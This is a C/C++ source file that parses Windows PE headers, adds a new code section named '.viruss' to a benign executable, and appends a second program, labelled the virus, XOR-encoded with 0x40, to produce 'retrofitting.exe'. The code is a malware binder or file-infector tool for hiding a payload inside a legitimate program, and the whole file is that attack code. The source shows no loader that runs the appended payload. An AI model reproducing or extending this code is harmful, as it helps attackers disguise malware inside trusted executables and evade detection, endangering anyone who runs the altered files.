#include <stdio.h>
#include <Windows.h>
#include <vector>
using namespace std;

typedef struct DOS_HEADER {             // DOS .EXE header
    WORD   e_magic;                     // Magic number
    WORD   e_cblp;                      // Bytes on last page of file
    WORD   e_cp;                        // Pages in file
    WORD   e_crlc;                      // Relocations
    WORD   e_cparhdr;                   // Size of header in paragraphs
    WORD   e_minalloc;                  // Minimum extra paragraphs needed
    WORD   e_maxalloc;                  // Maximum extra paragraphs needed
    WORD   e_ss;                        // Initial (relative) SS value
    WORD   e_sp;                        // Initial SP value
    WORD   e_csum;                      // Checksum
    WORD   e_ip;                        // Initial IP value
    WORD   e_cs;                        // Initial (relative) CS value
    WORD   e_lfarlc;                    // File address of relocation table
    WORD   e_ovno;                      // Overlay number
    WORD   e_res[4];                    // Reserved words
    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)
    WORD   e_oeminfo;                   // OEM information; e_oemid specific
    WORD   e_res2[10];                  // Reserved words
    LONG   e_lfanew;                    // File address of new exe header
} __IMAGE_DOS_HEADER;

typedef struct DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} __IMAGE_DATA_DIRECTORY;

typedef struct FILE_HEADER {
    WORD    Machine;
    WORD    NumberOfSections;
    DWORD   TimeDateStamp;
    DWORD   PointerToSymbolTable;
    DWORD   NumberOfSymbols;
    WORD    SizeOfOptionalHeader;
    WORD    Characteristics;
} __IMAGE_FILE_HEADER;

typedef struct OPTIONAL_HEADER64 {
    WORD        Magic;
    BYTE        MajorLinkerVersion;
    BYTE        MinorLinkerVersion;
    DWORD       SizeOfCode;
    DWORD       SizeOfInitializedData;
    DWORD       SizeOfUninitializedData;
    DWORD       AddressOfEntryPoint;
    DWORD       BaseOfCode;
    ULONGLONG   ImageBase;
    DWORD       SectionAlignment;
    DWORD       FileAlignment;
    WORD        MajorOperatingSystemVersion;
    WORD        MinorOperatingSystemVersion;
    WORD        MajorImageVersion;
    WORD        MinorImageVersion;
    WORD        MajorSubsystemVersion;
    WORD        MinorSubsystemVersion;
    DWORD       Win32VersionValue;
    DWORD       SizeOfImage;
    DWORD       SizeOfHeaders;
    DWORD       CheckSum;
    WORD        Subsystem;
    WORD        DllCharacteristics;
    ULONGLONG   SizeOfStackReserve;
    ULONGLONG   SizeOfStackCommit;
    ULONGLONG   SizeOfHeapReserve;
    ULONGLONG   SizeOfHeapCommit;
    DWORD       LoaderFlags;
    DWORD       NumberOfRvaAndSizes;
    DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} __IMAGE_OPTIONAL_HEADER64;

typedef struct SECTION_HEADER {
    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];
    union {
        DWORD   PhysicalAddress;
        DWORD   VirtualSize;
    } Misc;
    DWORD   VirtualAddress;
    DWORD   SizeOfRawData;
    DWORD   PointerToRawData;
    DWORD   PointerToRelocations;
    DWORD   PointerToLinenumbers;
    WORD    NumberOfRelocations;
    WORD    NumberOfLinenumbers;
    DWORD   Characteristics;
} __IMAGE_SECTION_HEADER;

typedef struct NT_HEADER64 {
    DWORD Signature;
    FILE_HEADER FileHeader;
    OPTIONAL_HEADER64 OptionalHeader;
} __IMAGE_NT_HEADERS64;



#pragma warning(disable : 4996)
int append_exe(const char* virus_prog_path, const char* benign_prog_path, DWORD virus_raw_size, DWORD virus_virtual_size, DWORD virus_image_size)
{

    printf("start copy benign to retrofitting.exe\n");
    FILE* benign_prog_read = fopen(benign_prog_path, "rb");
    FILE* retrofitting_write = fopen("retrofitting.exe", "wb");

    if (!benign_prog_read || !retrofitting_write) {
        printf("error opening files\n");
        return 1;
    }

    // copy DOS Header of bengin_prog to retrofitting
    printf("start copy DOS Header of bengin_prog to retrofitting\n");
    DOS_HEADER benign_dos_header;
    fread(&benign_dos_header, sizeof(DOS_HEADER), 1, benign_prog_read);
    fwrite(&benign_dos_header, sizeof(DOS_HEADER), 1, retrofitting_write);
    printf("finish\n");

    // copy the DOS stub of bengin_prog to retrofitting
    printf("start copy the DOS stub of bengin_prog to retrofitting\n");
    fseek(benign_prog_read, sizeof(DOS_HEADER), SEEK_SET);
    char stub_buffer[64];
    fread(&stub_buffer, sizeof(stub_buffer), 1, benign_prog_read);
    fwrite(&stub_buffer, sizeof(stub_buffer), 1, retrofitting_write);
    printf("finish\n");

    // copy rich header of bengin_prog to retrofitting byte by byte
    printf("start copy rich header of bengin_prog to retrofitting byte by byte\n");
    fseek(benign_prog_read, sizeof(DOS_HEADER) + sizeof(stub_buffer), SEEK_SET);
    char current_byte;
    for (int i = 0; i < benign_dos_header.e_lfanew - (sizeof(DOS_HEADER) + sizeof(stub_buffer)); i++) {
        fread(&current_byte, sizeof(current_byte), 1, benign_prog_read);
		fwrite(&current_byte, sizeof(current_byte), 1, retrofitting_write);
    }
    printf("finish\n");

    // copy signature of bengin_prog to retrofitting
    printf("start copy signature of bengin_prog to retrofitting\n");
    DWORD signature;
    fseek(benign_prog_read, benign_dos_header.e_lfanew, SEEK_SET);
    fread(&signature, sizeof(DWORD), 1, benign_prog_read);
    fwrite(&signature, sizeof(DWORD), 1, retrofitting_write);
    printf("finish\n");


    // copy File Header of bengin_prog to retrofitting
    printf("start copy File Header of bengin_prog to retrofitting\n");
    FILE_HEADER benign_file_header;
    fseek(benign_prog_read, benign_dos_header.e_lfanew + sizeof(DWORD), SEEK_SET);
    fread(&benign_file_header, sizeof(FILE_HEADER), 1, benign_prog_read);
    benign_file_header.NumberOfSections += 1;
    fwrite(&benign_file_header, sizeof(FILE_HEADER), 1, retrofitting_write);
    printf("finish\n");

    // copy optional header of bengin_prog to retrofitting
    printf("start copy optional header of bengin_prog to retrofitting\n");
    OPTIONAL_HEADER64 benign_optional_header;
    fseek(benign_prog_read, benign_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER), SEEK_SET);
    fread(&benign_optional_header, sizeof(OPTIONAL_HEADER64), 1, benign_prog_read);
    benign_optional_header.SizeOfImage += virus_raw_size;
    DWORD remainder = benign_optional_header.SizeOfImage % benign_optional_header.SectionAlignment;
    if (remainder != 0) {
        benign_optional_header.SizeOfImage += benign_optional_header.SectionAlignment - remainder;
    }
    fwrite(&benign_optional_header, sizeof(OPTIONAL_HEADER64), 1, retrofitting_write);
    printf("finish\n");

    // copy section headers of bengin_prog to retrofitting
    printf("start copy section headers of bengin_prog to retrofitting\n");
    SECTION_HEADER section_header;
    SECTION_HEADER last_section_header;
    vector<SECTION_HEADER> section_headers;
    DWORD max_virtual_address = 0;
    for (int i = 0; i < benign_file_header.NumberOfSections - 1; i++) {
        fread(&section_header, sizeof(SECTION_HEADER), 1, benign_prog_read);
        //fwrite(&section_header, sizeof(SECTION_HEADER), 1, retrofitting_write);
        if (section_header.VirtualAddress > max_virtual_address) {
            max_virtual_address = section_header.VirtualAddress;
            last_section_header = section_header;
        }
        section_headers.push_back(section_header);
    }


    // add new section header to retrofitting
    SECTION_HEADER new_section_header;
    strcpy((char*)new_section_header.Name, ".viruss");
    new_section_header.Misc.VirtualSize = virus_raw_size;
    new_section_header.VirtualAddress = last_section_header.VirtualAddress + last_section_header.Misc.VirtualSize;
    DWORD r = virus_raw_size % benign_optional_header.FileAlignment;
    if (r != 0) {
        virus_raw_size += benign_optional_header.FileAlignment - r;
    }
    new_section_header.SizeOfRawData = virus_raw_size; // needs to be FileAlignment aligned
    new_section_header.PointerToRawData = last_section_header.PointerToRawData + last_section_header.SizeOfRawData;
    new_section_header.PointerToRelocations = 0;
    new_section_header.PointerToLinenumbers = 0;
    new_section_header.NumberOfRelocations = 0;
    new_section_header.NumberOfLinenumbers = 0;
    new_section_header.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;
    //fseek(retrofitting_write, benign_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER) + sizeof(OPTIONAL_HEADER64) + (sizeof(SECTION_HEADER) * (benign_file_header.NumberOfSections - 1)), SEEK_SET);
    //fwrite(&new_section_header, sizeof(SECTION_HEADER), 1, retrofitting_write);

    DWORD re = (last_section_header.VirtualAddress + last_section_header.Misc.VirtualSize) % benign_optional_header.SectionAlignment;
    if (re != 0) {
        new_section_header.VirtualAddress = last_section_header.VirtualAddress + last_section_header.Misc.VirtualSize + benign_optional_header.SectionAlignment - re;
    }
    else {
        new_section_header.VirtualAddress = last_section_header.VirtualAddress + last_section_header.Misc.VirtualSize;
    }

    for (int i = 0; i < benign_file_header.NumberOfSections - 1; i++) {
        fwrite(&section_headers[i], sizeof(SECTION_HEADER), 1, retrofitting_write);
    }

    fseek(retrofitting_write, benign_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER) + sizeof(OPTIONAL_HEADER64) + (sizeof(SECTION_HEADER) * (benign_file_header.NumberOfSections - 1)), SEEK_SET);
    fwrite(&new_section_header, sizeof(SECTION_HEADER), 1, retrofitting_write);
    printf("finish\n");

    // copy rest of bengin_prog to retrofitting
    printf("start copy rest of bengin_prog to retrofitting\n");
    fseek(benign_prog_read, benign_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER) + sizeof(OPTIONAL_HEADER64) + (sizeof(SECTION_HEADER) * (benign_file_header.NumberOfSections - 1)) + sizeof(SECTION_HEADER), SEEK_SET);
    char buffer_copy;
    while (!feof(benign_prog_read)) {
        size_t bytes_copy = fread(&buffer_copy, sizeof(BYTE), sizeof(buffer_copy), benign_prog_read);
        if (bytes_copy > 0) {
            fwrite(&buffer_copy, 1, bytes_copy, retrofitting_write);
        }
        else {
            break;
        }
    }
    printf("finish\n");

    fclose(benign_prog_read);
    fclose(retrofitting_write);

    printf("start append virus to retrofitting.exe\n");
    FILE* virus_prog_read = fopen(virus_prog_path, "rb");
    FILE* retrofitting_append = fopen("retrofitting.exe", "ab");

    if (!virus_prog_read || !retrofitting_append) {
        printf("error opening files\n");
        return 1;
    }

    // copy all of virus_prog to end retrofitting
    fseek(retrofitting_append, 0, SEEK_END);

    char buffer_append;
    while (!feof(virus_prog_read)) {
        size_t bytes_append = fread(&buffer_append, 1, sizeof(buffer_append), virus_prog_read);
        if (bytes_append > 0) {
            buffer_append ^= 0x40;
            fwrite(&buffer_append, 1, bytes_append, retrofitting_append);
        }
        else {
            break;
        }
    }

    printf("finish\n");
    fclose(virus_prog_read);
    fclose(retrofitting_append);
    return 0;
}

#pragma warning(disable : 4996)
int main(int argc, char* argv[]) {

    if (argc != 3) {
        printf("Incorrect arugments - please provide a file path to an executable to append (program1.exe) and a file path to an executable that will have the first argument appended too.\n");
        return 1;
    }

    const char* virus_prog_path = argv[1];
    const char* benign_prog_path = argv[2];
    printf("Path to virus program: %s\n", virus_prog_path);
    printf("Path to benign program: %s\n", benign_prog_path);

    // todo: encrypt program1.exe by xoring with 0x40

    FILE* virus_prog = fopen(virus_prog_path, "r");

    DOS_HEADER virus_dos_header64;
    if (fread(&virus_dos_header64, sizeof(DOS_HEADER), 1, virus_prog) != 1) {
        fclose(virus_prog);
        printf("Error reading virus DOS header\n");
        return 1;
    }

    fseek(virus_prog, virus_dos_header64.e_lfanew, SEEK_SET);
    NT_HEADER64 virus_nt_header64;
    if (fread(&virus_nt_header64, sizeof(NT_HEADER64), 1, virus_prog) != 1) {
        fclose(virus_prog);
        printf("Error reading the virus NT header.\n");
        return 1;
    }

    SECTION_HEADER section_header;
    SECTION_HEADER last_section_header;
    DWORD max_virtual_address = 0;
    for (int i = 0; i < virus_nt_header64.FileHeader.NumberOfSections; i++) {
        fread(&section_header, sizeof(SECTION_HEADER), 1, virus_prog);
        if (section_header.VirtualAddress > max_virtual_address) {
            max_virtual_address = section_header.VirtualAddress;
            last_section_header = section_header;
        }
    }

    DWORD virus_virtual_size = last_section_header.VirtualAddress + last_section_header.Misc.VirtualSize;
    DWORD virus_raw_size = last_section_header.PointerToRawData + last_section_header.SizeOfRawData;

    append_exe(virus_prog_path, benign_prog_path, virus_raw_size, virus_virtual_size, virus_nt_header64.OptionalHeader.SizeOfImage);

    return 0;
}
